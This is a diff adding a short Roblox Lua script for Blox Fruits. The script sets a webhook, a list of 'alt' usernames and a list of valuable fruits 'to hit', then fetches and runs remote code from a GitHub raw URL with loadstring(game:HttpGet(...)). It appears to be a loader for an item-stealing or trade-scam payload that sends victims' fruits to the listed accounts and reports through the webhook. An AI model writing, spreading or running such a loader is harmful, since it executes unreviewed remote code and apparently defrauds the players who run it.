@@ -1,0 +1,5 @@
+Webhook = "" -- << Your Webhook
+Usernames = {"Bumbaa723", "Goes_secondsea", "Bumbaa723"} -- << Your usernames here, you can add as many alts as you want
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want the script to detect
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/W-Scripts/TFv2-Bloxfruits/refs/heads/main/RedZ_dfg"))()
